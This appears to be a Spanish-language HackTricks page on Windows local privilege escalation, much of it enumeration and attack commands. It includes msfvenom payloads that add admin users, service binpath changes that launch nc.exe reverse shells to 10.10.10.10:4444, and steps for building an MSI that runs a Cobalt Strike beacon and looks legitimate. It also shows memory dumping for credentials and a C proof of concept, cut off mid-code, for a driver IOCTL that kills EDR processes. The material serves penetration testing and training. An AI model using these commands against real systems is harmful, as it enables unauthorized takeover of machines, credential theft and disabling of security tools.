# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Mejor herramienta para buscar vectores de Windows local privilege escalation:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Teoría inicial de Windows

### Access Tokens

**Si no sabes qué son los Windows Access Tokens, lee la siguiente página antes de continuar:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Consulta la siguiente página para más información sobre ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Si no sabes qué son integrity levels en Windows, deberías leer la siguiente página antes de continuar:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Hay diferentes cosas en Windows que podrían **impedirte enumerar el sistema**, ejecutar ejecutables o incluso **detectar tus actividades**. Deberías **leer** la siguiente **página** y **enumerar** todos estos **mecanismos** de **defensa** antes de comenzar la enumeración de privilege escalation:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## System Info

### Enumeración de información de versión

Comprueba si la versión de Windows tiene alguna vulnerabilidad conocida (revisa también los parches aplicados).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Exploits por versión

This [site](https://msrc.microsoft.com/update-guide/vulnerability) es útil para buscar información detallada sobre vulnerabilidades de seguridad de Microsoft. Esta base de datos tiene más de 4,700 vulnerabilidades de seguridad, mostrando la **massive attack surface** que presenta un entorno Windows.

**En el sistema**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**Localmente con información del sistema**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

Repositorios de exploits en GitHub:

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Entorno

¿Alguna credencial/información Juicy guardada en las env variables?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Historial de PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Archivos de transcripción de PowerShell

Puedes aprender cómo activarlo en [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Se registran los detalles de las ejecuciones del pipeline de PowerShell, abarcando los comandos ejecutados, las invocaciones de comandos y partes de scripts. Sin embargo, es posible que no se capturen todos los detalles de ejecución ni los resultados de salida.

Para habilitar esto, siga las instrucciones en la sección "Transcript files" de la documentación, optando por **"Module Logging"** en lugar de **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Para ver los últimos 15 eventos de los registros de PowersShell puedes ejecutar:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Se captura un registro completo de la actividad y del contenido íntegro de la ejecución del script, asegurando que cada bloque de código quede documentado mientras se ejecuta. Este proceso conserva una pista de auditoría exhaustiva de cada actividad, valiosa para la investigación forense y para analizar comportamientos maliciosos. Al documentar toda la actividad en el momento de la ejecución, se obtienen detalles exhaustivos sobre el proceso.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Los eventos de registro para el Script Block se pueden encontrar en el Visor de eventos de Windows en la ruta: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\\
Para ver los últimos 20 eventos puedes usar:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Configuración de Internet
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Unidades
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Puedes comprometer el sistema si las actualizaciones no se solicitan usando http**S** sino http.

Empiezas comprobando si la red usa una actualización WSUS no-SSL ejecutando lo siguiente en cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
O lo siguiente en PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Si recibes una respuesta como alguna de estas:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` or `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` is equals to `1`.

Then, **it is exploitable.** If the last registry is equals to 0, then, the WSUS entry will be ignored.

In orther to exploit this vulnerabilities you can use tools like: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- These are MiTM weaponized exploits scripts to inject 'fake' updates into non-SSL WSUS traffic.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basically, this is the flaw that this bug exploits:

> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer’s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.
>
> Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.

You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Many enterprise agents expose a localhost IPC surface and a privileged update channel. If enrollment can be coerced to an attacker server and the updater trusts a rogue root CA or weak signer checks, a local user can deliver a malicious MSI that the SYSTEM service installs. See a generalized technique (based on the Netskope stAgentSvc chain – CVE-2025-0309) here:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

A **local privilege escalation** vulnerability exists in Windows **domain** environments under specific conditions. These conditions include environments where **LDAP signing is not enforced,** users possess self-rights allowing them to configure **Resource-Based Constrained Delegation (RBCD),** and the capability for users to create computers within the domain. It is important to note that these **requirements** are met using **default settings**.

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

For more information about the flow of the attack check [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**If** these 2 registers are **enabled** (value is **0x1**), then users of any privilege can **install** (execute) `*.msi` files as NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Si tienes una sesión meterpreter puedes automatizar esta técnica usando el módulo **`exploit/windows/local/always_install_elevated`**

### PowerUP

Usa el comando `Write-UserAddMSI` de power-up para crear dentro del directorio actual un binario Windows MSI para escalar privilegios. Este script genera un instalador MSI precompilado que solicita la adición de un usuario/grupo (por lo que necesitarás acceso GUI):
```
Write-UserAddMSI
```
Simplemente ejecuta el binario creado para escalar privilegios.

### MSI Wrapper

Lee este tutorial para aprender cómo crear un MSI wrapper usando estas herramientas. Ten en cuenta que puedes envolver un archivo "**.bat**" si **solo** quieres **ejecutar** **líneas de comando**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generate** with Cobalt Strike or Metasploit a **new Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- Open **Visual Studio**, select **Create a new project** and type "installer" into the search box. Select the **Setup Wizard** project and click **Next**.
- Give the project a name, like **AlwaysPrivesc**, use **`C:\privesc`** for the location, select **place solution and project in the same directory**, and click **Create**.
- Keep clicking **Next** until you get to step 3 of 4 (choose files to include). Click **Add** and select the Beacon payload you just generated. Then click **Finish**.
- Highlight the **AlwaysPrivesc** project in the **Solution Explorer** and in the **Properties**, change **TargetPlatform** from **x86** to **x64**.
- There are other properties you can change, such as the **Author** and **Manufacturer** which can make the installed app look more legitimate.
- Right-click the project and select **View > Custom Actions**.
- Right-click **Install** and select **Add Custom Action**.
- Double-click on **Application Folder**, select your **beacon.exe** file and click **OK**. This will ensure that the beacon payload is executed as soon as the installer is run.
- Under the **Custom Action Properties**, change **Run64Bit** to **True**.
- Finally, **build it**.
- If the warning `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` is shown, make sure you set the platform to x64.

### MSI Installation

Para ejecutar la **instalación** del archivo `.msi` malicioso en **segundo plano:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Para explotar esta vulnerabilidad puedes usar: _exploit/windows/local/always_install_elevated_

## Antivirus y detectores

### Configuración de auditoría

Estos ajustes deciden qué se está **registrando**, así que debes prestar atención
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, es interesante saber a dónde se envían los logs
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** está diseñado para la **gestión de contraseñas del Administrador local**, garantizando que cada contraseña sea **única, aleatoria y actualizada regularmente** en equipos unidos a un dominio. Estas contraseñas se almacenan de forma segura en Active Directory y solo pueden ser accedidas por usuarios que hayan recibido permisos suficientes a través de ACLs, permitiéndoles ver las contraseñas del administrador local si están autorizados.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Si está activo, **las contraseñas en texto claro se almacenan en LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest)
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

A partir de **Windows 8.1**, Microsoft introdujo una protección mejorada para la Autoridad de Seguridad Local (LSA) para **bloquear** intentos de procesos no confiables de **leer su memoria** o inyectar código, fortaleciendo aún más la seguridad del sistema.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** fue introducido en **Windows 10**. Su propósito es proteger las credenciales almacenadas en un dispositivo frente a amenazas como pass-the-hash attacks.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** son autenticadas por la **Local Security Authority** (LSA) y utilizadas por los componentes del sistema operativo. Cuando los datos de inicio de sesión de un usuario son autenticados por un registered security package, normalmente se establecen domain credentials para ese usuario.\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Usuarios & Grupos

### Enumerar Usuarios & Grupos

Deberías comprobar si alguno de los grupos a los que perteneces tiene permisos interesantes
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Grupos privilegiados

Si **perteneces a algún grupo privilegiado, es posible que puedas escalar privilegios**. Aprende sobre los grupos privilegiados y cómo abusar de ellos para escalar privilegios aquí:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulación de tokens

**Aprende más** sobre qué es un **token** en esta página: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Consulta la siguiente página para **aprender sobre tokens interesantes** y cómo abusar de ellos:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Usuarios conectados / Sesiones
```bash
qwinsta
klist sessions
```
### Carpetas de inicio
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Política de contraseñas
```bash
net accounts
```
### Obtener el contenido del portapapeles
```bash
powershell -command "Get-Clipboard"
```
## Procesos en ejecución

### Permisos de archivos y carpetas

Como primer paso, al listar los procesos, **comprueba si hay contraseñas en la línea de comandos del proceso**.\
Comprueba si puedes **sobrescribir algún binario en ejecución** o si tienes permisos de escritura en la carpeta de binarios para explotar posibles [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Siempre comprueba si hay [**electron/cef/chromium debuggers** en ejecución; podrías abusar de ellos para escalar privilegios](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Comprobando permisos de los binarios de los procesos**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Comprobando permisos de las carpetas de los binarios de los procesos (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Puedes crear un volcado de memoria de un proceso en ejecución usando **procdump** de sysinternals.  
Servicios como FTP contienen las **credentials in clear text in memory**. Intenta volcar la memoria y leer las credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Aplicaciones GUI inseguras

**Las aplicaciones que se ejecutan como SYSTEM pueden permitir a un usuario abrir un CMD o explorar directorios.**

Ejemplo: "Windows Help and Support" (Windows + F1), busca "command prompt", haz clic en "Click to open Command Prompt"

## Servicios

Service Triggers permiten que Windows inicie un servicio cuando ocurren ciertas condiciones (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.). Incluso sin los permisos SERVICE_START a menudo puedes iniciar servicios privilegiados activando sus triggers. Consulta las técnicas de enumeración y activación aquí:

-
{{#ref}}
service-triggers.md
{{#endref}}

Obtén una lista de servicios:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Permisos

Puedes usar **sc** para obtener información de un servicio.
```bash
sc qc <service_name>
```
Se recomienda tener el binario **accesschk** de _Sysinternals_ para comprobar el nivel de privilegio requerido para cada servicio.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Se recomienda comprobar si "Authenticated Users" pueden modificar algún servicio:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Habilitar servicio

Si estás teniendo este error (por ejemplo con SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Puedes habilitarlo usando
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Tenga en cuenta que el servicio upnphost depende de SSDPSRV para funcionar (para XP SP1)**

**Otra solución** a este problema es ejecutar:
```
sc.exe config usosvc start= auto
```
### **Modificar la ruta del binario del servicio**

En el escenario en el que el grupo "Authenticated users" posee **SERVICE_ALL_ACCESS** sobre un servicio, es posible modificar el binario ejecutable del servicio. Para modificar y ejecutar **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Reiniciar servicio
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Los privilegios pueden escalarse mediante varios permisos:

- **SERVICE_CHANGE_CONFIG**: Permite reconfigurar el binario del servicio.
- **WRITE_DAC**: Habilita la reconfiguración de permisos, permitiendo cambiar las configuraciones del servicio.
- **WRITE_OWNER**: Permite adquirir la propiedad y reconfigurar permisos.
- **GENERIC_WRITE**: Otorga la capacidad de cambiar las configuraciones del servicio.
- **GENERIC_ALL**: También otorga la capacidad de cambiar las configuraciones del servicio.

Para la detección y explotación de esta vulnerabilidad, se puede utilizar _exploit/windows/local/service_permissions_.

### Permisos débiles en los binarios de servicios

**Comprueba si puedes modificar el binario que es ejecutado por un servicio** o si tienes **permisos de escritura en la carpeta** donde se encuentra el binario ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Puedes obtener todos los binarios ejecutados por un servicio usando **wmic** (not in system32) y comprobar tus permisos usando **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
También puedes usar **sc** e **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Permisos para modificar el registro de servicios

Deberías comprobar si puedes modificar algún registro de servicio.\
Puedes **comprobar** tus **permisos** sobre un **registro de servicio** haciendo:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Debe comprobarse si **Authenticated Users** o **NT AUTHORITY\INTERACTIVE** poseen permisos `FullControl`. Si es así, el binario ejecutado por el servicio puede ser alterado.

Para cambiar el Path del binario ejecutado:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Permisos AppendData/AddSubdirectory en el registro de servicios

Si tienes este permiso sobre una clave del registro, esto significa que **puedes crear subclaves del registro a partir de esta**. En el caso de los servicios de Windows, esto es **suficiente para ejecutar código arbitrario:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Rutas de servicio sin comillas

Si la ruta a un ejecutable no está entre comillas, Windows intentará ejecutar cada segmento antes de un espacio.

Por ejemplo, para la ruta _C:\Program Files\Some Folder\Service.exe_ Windows intentará ejecutar:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Enumera todas las rutas de servicio sin comillas, excluyendo las que pertenecen a los servicios integrados de Windows:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Puedes detectar y explotar** esta vulnerabilidad con metasploit: `exploit/windows/local/trusted\_service\_path` Puedes crear manualmente un binario de servicio con metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Acciones de recuperación

Windows permite a los usuarios especificar acciones a realizar si un servicio falla. Esta función se puede configurar para apuntar a un binario. Si este binario puede ser reemplazado, podría ser posible una escalada de privilegios. Se pueden encontrar más detalles en la [documentación oficial](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Aplicaciones

### Aplicaciones instaladas

Verifica los **permisos de los binarios** (tal vez puedas sobrescribir uno y escalar privilegios) y de las **carpetas** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Permisos de escritura

Comprueba si puedes modificar algún archivo de configuración para leer algún archivo especial o si puedes modificar algún binario que vaya a ser ejecutado por una cuenta Administrator (schedtasks).

Una forma de encontrar permisos débiles en carpetas/archivos del sistema es hacer:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Ejecutar al inicio

**Comprueba si puedes sobrescribir algún registry o binary que vaya a ser ejecutado por un usuario diferente.**\
**Lee** la **siguiente página** para aprender más sobre interesantes **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Controladores

Busca posibles **controladores de terceros extraños/vulnerables**
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Si un driver expone una primitiva arbitraria de lectura/escritura de kernel (común en manejadores IOCTL mal diseñados), puedes escalar robando un token SYSTEM directamente de la memoria del kernel. Consulta la técnica paso a paso aquí:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Para errores de condición de carrera donde la llamada vulnerable abre una ruta del Object Manager controlada por el atacante, ralentizar deliberadamente la búsqueda (usando componentes de longitud máxima o cadenas de directorios profundas) puede ampliar la ventana de microsegundos a decenas de microsegundos:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Primitivas de corrupción de memoria en el hive del registro

Las vulnerabilidades modernas de hive permiten preparar diseños deterministas, abusar de descendientes escribibles de HKLM/HKU, y convertir corrupción de metadatos en desbordamientos del paged-pool del kernel sin un driver personalizado. Aprende la cadena completa aquí:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusando de la ausencia de FILE_DEVICE_SECURE_OPEN en device objects (LPE + EDR kill)

Algunos drivers de terceros firmados crean su device object con un SDDL estricto vía IoCreateDeviceSecure pero olvidan establecer FILE_DEVICE_SECURE_OPEN en DeviceCharacteristics. Sin esta bandera, el DACL seguro no se aplica cuando el dispositivo se abre mediante una ruta que contiene un componente adicional, permitiendo a cualquier usuario no privilegiado obtener un handle usando una ruta de namespace como:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Una vez que un usuario puede abrir el dispositivo, los IOCTLs privilegiados expuestos por el driver pueden ser abusados para LPE y manipulación. Capacidades de ejemplo observadas en el mundo real:
- Return full-access handles to arbitrary processes (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Terminate arbitrary processes, including Protected Process/Light (PP/PPL), allowing AV/EDR kill from user land via kernel.

Patrón mínimo de PoC (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
